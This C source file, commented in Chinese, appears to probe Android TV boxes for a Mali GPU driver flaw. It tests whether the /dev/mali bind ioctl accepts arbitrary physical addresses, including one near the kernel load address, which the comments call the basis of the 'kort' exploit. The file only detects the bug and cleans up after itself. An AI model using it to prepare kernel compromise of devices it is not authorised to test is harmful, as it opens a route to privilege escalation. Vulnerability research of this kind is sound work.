/*
 * kort_probe_miboxs.c
 * 探测 /dev/mali 是否暴露 kort 利用所依赖的 bug
 * 即 _MALI_UK_BIND_MEM 是否允许把"任意外部物理内存"映射到 GPU。
 *
 * 修复:
 *  - 禁用 stdout 缓冲（adb shell 下全缓冲导致无输出）
 *  - 每次 printf 后 fflush
 *  - 增加 alarm 超时防止 ioctl 卡死
 */
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <errno.h>
#include <signal.h>

#define MALI_IOC_BASE 0x82
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define MALI_IOC_MEMORY_BASE (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define _MALI_UK_ALLOC_MEM 0
#define _MALI_UK_FREE_MEM 1
#define _MALI_UK_BIND_MEM 2
#define _MALI_UK_UNBIND_MEM 3
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

typedef struct {
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
} mali_uk_alloc_mem_s;

typedef struct {
    uint64_t ctx;
    uint32_t vaddr;
    uint32_t size;
    uint32_t flags;
    uint32_t padding;
    union {
        struct { uint32_t secure_id; uint32_t rights; uint32_t flags; } bind_ump;
        struct { uint32_t mem_fd; uint32_t rights; uint32_t flags; } bind_dma_buf;
        struct { uint32_t phys_addr; uint32_t rights; uint32_t flags; } bind_ext_memory;
    } mem_union;
} mali_uk_bind_mem_s;

typedef struct {
    uint64_t ctx;
    uint32_t flags;
    uint32_t vaddr;
} mali_uk_unbind_mem_s;

#define MALI_IOC_MEM_FREE \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_ALLOC \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_BIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, mali_uk_bind_mem_s)
#define MALI_IOC_MEM_UNBIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, mali_uk_unbind_mem_s)

#define PAGE_SIZE 4096

static void timeout_handler(int sig) {
    (void)sig;
    fprintf(stderr, "\n[!] TIMEOUT after 10s - ioctl likely blocked\n");
    _exit(2);
}

int main() {
    /* 关键: 禁用缓冲, 否则 adb shell 下全缓冲不输出 */
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("[*] kort_probe_miboxs starting\n");
    printf("[*] sizeof(alloc)=%zu sizeof(bind)=%zu\n",
           sizeof(mali_uk_alloc_mem_s), sizeof(mali_uk_bind_mem_s));
    printf("[*] MALI_IOC_MEM_ALLOC=0x%x\n", MALI_IOC_MEM_ALLOC);
    printf("[*] MALI_IOC_MEM_BIND=0x%x\n", MALI_IOC_MEM_BIND);
    fflush(stdout);

    /* 超时保护: 10秒后强制退出 */
    signal(SIGALRM, timeout_handler);
    alarm(10);

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) {
        printf("[-] open /dev/mali failed: %s (errno=%d)\n", strerror(errno), errno);
        return 1;
    }
    printf("[+] opened /dev/mali fd=%d\n", fd);
    fflush(stdout);

    /* 1) 基本内存分配是否可用 */
    mali_uk_alloc_mem_s alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.gpu_vaddr = 0x40000000;
    alloc.psize = PAGE_SIZE * 4;
    alloc.vsize = PAGE_SIZE * 4;
    int r = ioctl(fd, MALI_IOC_MEM_ALLOC, &alloc);
    printf("[1] ALLOC -> ret=%d errno=%d (%s) backend=0x%llx\n",
           r, errno, strerror(errno), (unsigned long long)alloc.backend_handle);
    fflush(stdout);

    if (r != 0) {
        printf("[-] ALLOC failed, skipping BIND test\n");
        close(fd);
        return 1;
    }

    /* 2) 关键探测: BIND 任意外部物理内存是否被允许 */
    uint32_t cand[] = {
        0x00000000,  /* 起始地址 */
        0x01000000,  /* 16MB */
        0x01080000,  /* 内核加载地址附近 */
        0x10000000,  /* 256MB */
        0x80000000,  /* 2GB */
    };
    int n = sizeof(cand)/sizeof(cand[0]);
    int accepted = 0;

    for (int i = 0; i < n; i++) {
        mali_uk_bind_mem_s b;
        memset(&b, 0, sizeof(b));
        b.vaddr = 0x40030000;
        b.size  = PAGE_SIZE;
        b.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
        b.mem_union.bind_ext_memory.phys_addr = cand[i];
        b.mem_union.bind_ext_memory.rights = 0x37;

        int rb = ioctl(fd, MALI_IOC_MEM_BIND, &b);
        const char *tag = "";
        if (rb == 0) {
            tag = "  <== ACCEPTED (BUG PRESENT!)";
            accepted++;
        }
        printf("[2.%d] BIND phys=0x%08x -> ret=%d errno=%d (%s)%s\n",
               i, cand[i], rb, errno, strerror(errno), tag);
        fflush(stdout);

        /* unbind 后再测下一个 */
        if (rb == 0) {
            mali_uk_unbind_mem_s ub;
            memset(&ub, 0, sizeof(ub));
            ub.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
            ub.vaddr = 0x40030000;
            ioctl(fd, MALI_IOC_MEM_UNBIND, &ub);
        }
    }

    alarm(0);  /* 取消超时 */

    /* 清理 */
    mali_uk_alloc_mem_s mfree;
    memset(&mfree, 0, sizeof(mfree));
    mfree.gpu_vaddr = 0x40000000;
    ioctl(fd, MALI_IOC_MEM_FREE, &mfree);
    close(fd);

    printf("\n[*] Summary: %d/%d physical addresses accepted\n", accepted, n);
    if (accepted > 0) {
        printf("[+] KORT BUG PRESENT - external physical memory bind is allowed!\n");
    } else {
        printf("[-] No BIND accepted - driver likely restricts external memory\n");
    }
    printf("[*] done\n");
    fflush(stdout);
    return 0;
}
